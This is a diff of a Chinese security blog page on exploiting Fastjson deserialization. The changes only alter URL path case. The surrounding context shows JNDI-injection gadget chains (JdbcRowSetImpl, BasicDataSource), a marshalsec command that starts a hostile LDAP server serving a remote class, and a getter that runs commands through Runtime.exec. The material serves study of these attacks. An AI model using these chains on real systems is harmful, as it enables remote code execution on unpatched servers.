@@ -22,21 +22,21 @@
     <meta name="description" content="到了喜闻乐见的Fastjson。 前言Fastjson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。顾名思义，FastJson的特点就是快。 先从最简单的用法说起吧。 Basic Usage依赖用的1.2.23 12345&lt;dependency&gt;    &lt;groupId&gt;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Fastjson">
-<meta property="og:url" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/index.html">
+<meta property="og:url" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/index.html">
 <meta property="og:site_name" content="EddieMurphy&#39;s blog">
 <meta property="og:description" content="到了喜闻乐见的Fastjson。 前言Fastjson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。顾名思义，FastJson的特点就是快。 先从最简单的用法说起吧。 Basic Usage依赖用的1.2.23 12345&lt;dependency&gt;    &lt;groupId&gt;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/image-20240801215837593.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/image-20240801220859119.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/image-20240801222516262.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/image-20240801222607739.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/image-20240801222706621.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/image-20240801215837593.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/image-20240801220859119.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/image-20240801222516262.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/image-20240801222607739.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/image-20240801222706621.png">
 <meta property="article:published_time" content="2024-08-01T12:20:56.000Z">
 <meta property="article:modified_time" content="2024-08-01T14:41:21.892Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/08/01/Fastjson/image-20240801215837593.png">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/08/01/fastjson/image-20240801215837593.png">
   
   
   
@@ -412,7 +412,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>		<span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-built_in">this</span>.conn = <span class="hljs-built_in">this</span>.connect();<br>		<span class="hljs-built_in">this</span>.conn = setAutoCommit(var1);<br>	&#125;<br>	<span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>当<code>conn == null</code>时，调用<code>connect()</code>:</p>
-<p><img src="/2024/08/01/Fastjson/image-20240801215837593.png" srcset="/img/loading.gif" lazyload alt="image-20240801215837593"></p>
+<p><img src="/2024/08/01/fastjson/image-20240801215837593.png" srcset="/img/loading.gif" lazyload alt="image-20240801215837593"></p>
 <p>经典的<code>(new InitialContext()).lookup()</code>，那么只要dataSourceName设为恶意远程RMI服务或ldap服务即可。</p>
 <blockquote>
 <p>{</p>
@@ -424,7 +424,7 @@
 <p>可以利用marshalsec开启ldap服务：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp .\marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="hljs-comment">//127.0.0.1:8000/#calc 8099</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/08/01/Fastjson/image-20240801220859119.png" srcset="/img/loading.gif" lazyload alt="image-20240801220859119"></p>
+<p><img src="/2024/08/01/fastjson/image-20240801220859119.png" srcset="/img/loading.gif" lazyload alt="image-20240801220859119"></p>
 <h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>fastjson网传的三条利用链如下：</p>
 <ul>
 <li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li>
@@ -442,7 +442,7 @@
 
 <p><strong>调用链：</strong></p>
 <p><code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;createDriver()</code></p>
-<p><img src="/2024/08/01/Fastjson/image-20240801222516262.png" srcset="/img/loading.gif" lazyload alt="image-20240801222516262"></p>
+<p><img src="/2024/08/01/fastjson/image-20240801222516262.png" srcset="/img/loading.gif" lazyload alt="image-20240801222516262"></p>
 <p><code>Class.forName</code>第二个参数<code>initial</code>为true时，类加载后将会直接执行<code>static&#123;&#125;</code>块中的代码。</p>
 <p><code>driverClassLoader</code>和<code>driverClassName</code>都可以通过fastjson控制</p>
 <blockquote>
@@ -458,7 +458,7 @@
 <p> }: “bbb”</p>
 <p>}</p>
 </blockquote>
-<p><img src="/2024/08/01/Fastjson/image-20240801222607739.png" srcset="/img/loading.gif" lazyload alt="image-20240801222607739"></p>
+<p><img src="/2024/08/01/fastjson/image-20240801222607739.png" srcset="/img/loading.gif" lazyload alt="image-20240801222607739"></p>
 <p>实际上面的getConnection不满足fastjson对自动调用getter的要求，前面说过：</p>
 <blockquote>
 <p>满足条件的getter：</p>
@@ -473,7 +473,7 @@
 <p>在<code>&#123;&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;……&#125;</code> 这一整段外面再套一层<code>&#123;&#125;</code>，这样的话会把这个整体当做一个JSONObject，会把这个当做key，值为bbb</p>
 <p>将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法（因为key一定要是String类型）</p>
 <p>而且JSONObject是Map的子类，当调用<code>toString</code>的时候，会依次调用该类的getter方法获取值。所以会调用到<code>getConnection</code>方法。</p>
-<p><img src="/2024/08/01/Fastjson/image-20240801222706621.png" srcset="/img/loading.gif" lazyload alt="image-20240801222706621"></p>
+<p><img src="/2024/08/01/fastjson/image-20240801222706621.png" srcset="/img/loading.gif" lazyload alt="image-20240801222706621"></p>
 <p>当fastjson&gt;&#x3D;1.2.36的时候，可以使用<code>$ref</code>方式调用getter。</p>
 <p>ref是fastjson特有的JSONPath语法，用来引用之前出现的对象：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;seter call&quot;</span>);<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;geter call&quot;</span>);<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -517,7 +517,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>Fastjson</div>
-      <div>https://eddiemurphy89.github.io/2024/08/01/Fastjson/</div>
+      <div>https://eddiemurphy89.github.io/2024/08/01/fastjson/</div>
     </div>
     <div class="license-meta">
       
